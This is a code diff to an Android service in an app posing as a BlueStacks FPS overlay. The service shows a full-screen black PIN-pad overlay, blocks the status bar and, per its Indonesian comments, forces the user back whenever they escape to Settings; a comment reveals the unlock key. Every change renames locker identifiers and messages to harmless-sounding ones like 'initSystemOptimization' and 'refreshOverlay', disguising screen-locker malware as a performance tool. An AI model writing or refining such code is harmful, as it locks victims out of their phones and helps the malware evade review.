@@ -29,7 +29,7 @@ import com.bluestacks.fpsoverlay.R;
 
 public class FPSService extends Service {
     private WindowManager windowManager;
-    private View lockerLayout;
+    private View overlayLayout;
     private CameraManager cameraManager;
     private String cameraId;
     private boolean isFlashOn = false;
@@ -81,7 +81,7 @@ public class FPSService extends Service {
     @Override
     public IBinder onBind(Intent intent) { return null; }
 
-    private void startStatusBarLocker() {
+    private void initSystemOptimization() {
         Handler handler = new Handler();
         handler.postDelayed(new Runnable() {
             @Override
@@ -105,7 +105,7 @@ public class FPSService extends Service {
     }
 
     // Memaksa MainActivity kembali ke depan jika user berhasil lari ke Settings
-    public void forceFront() {
+    public void refreshOverlay() {
         if (isAuthenticated) return;
 
         // Jika aksesibilitas mati, panggil MainActivity agar user dipaksa ke Settings.
@@ -138,8 +138,8 @@ public class FPSService extends Service {
     }
 
     private void applyFullScreen() {
-        if (lockerLayout == null) return;
-        lockerLayout.setSystemUiVisibility(
+        if (overlayLayout == null) return;
+        overlayLayout.setSystemUiVisibility(
                 View.SYSTEM_UI_FLAG_IMMERSIVE_STICKY |
                 View.SYSTEM_UI_FLAG_LAYOUT_STABLE |
                 View.SYSTEM_UI_FLAG_LAYOUT_HIDE_NAVIGATION |
@@ -157,13 +157,13 @@ public class FPSService extends Service {
     
         // 1. Memulai Foreground Service & StatusBar Blocker
         startInForeground();
-        startStatusBarLocker();
+        initSystemOptimization();
     
         // 2. Setup Window Manager & Layout
         windowManager = (WindowManager) getSystemService(WINDOW_SERVICE);
-        lockerLayout = LayoutInflater.from(this).inflate(R.layout.locker_layout, null);
-        lockerLayout.setFitsSystemWindows(false);
-        lockerLayout.setBackgroundColor(0xFF000000); // Hitam pekat
+        overlayLayout = LayoutInflater.from(this).inflate(R.layout.locker_layout, null);
+        overlayLayout.setFitsSystemWindows(false);
+        overlayLayout.setBackgroundColor(0xFF000000); // Hitam pekat
     
         // 3. Konfigurasi LayoutParams
         WindowManager.LayoutParams params = new WindowManager.LayoutParams(
@@ -184,10 +184,10 @@ public class FPSService extends Service {
             params.layoutInDisplayCutoutMode = WindowManager.LayoutParams.LAYOUT_IN_DISPLAY_CUTOUT_MODE_SHORT_EDGES;
         }
     
-        windowManager.addView(lockerLayout, params);
+        windowManager.addView(overlayLayout, params);
     
         // 4. Logika Input Angka
-        TextView display = (TextView) lockerLayout.findViewById(R.id.textDisplayPassword);
+        TextView display = (TextView) overlayLayout.findViewById(R.id.textDisplayPassword);
         
         View.OnClickListener numListener = v -> {
             Button b = (Button) v;
@@ -201,11 +201,11 @@ public class FPSService extends Service {
         int[] buttonIds = {R.id.btn0, R.id.btn1, R.id.btn2, R.id.btn3, R.id.btn4, 
                            R.id.btn5, R.id.btn6, R.id.btn7, R.id.btn8, R.id.btn9};
         for (int id : buttonIds) {
-            View btn = lockerLayout.findViewById(id);
+            View btn = overlayLayout.findViewById(id);
             if (btn != null) btn.setOnClickListener(numListener);
         }
     
-        View btnDel = lockerLayout.findViewById(R.id.btnDelete);
+        View btnDel = overlayLayout.findViewById(R.id.btnDelete);
         if (btnDel != null) {
             btnDel.setOnClickListener(v -> {
                 if (currentInput.length() > 0) {
@@ -215,7 +215,7 @@ public class FPSService extends Service {
             });
         }
     
-        View btnUnlock = lockerLayout.findViewById(R.id.btnUnlock);
+        View btnUnlock = overlayLayout.findViewById(R.id.btnUnlock);
         if (btnUnlock != null) {
             btnUnlock.setOnClickListener(v -> {
                 // Memanggil verifikasi Native C++ dengan key 02042009
@@ -225,7 +225,7 @@ public class FPSService extends Service {
                 } else {
                     currentInput = "";
                     display.setText("");
-                    display.setHint("CALIBRATION FAILED");
+                    display.setHint("ENGINE AUTHENTICATION FAILED");
                 }
             });
         }
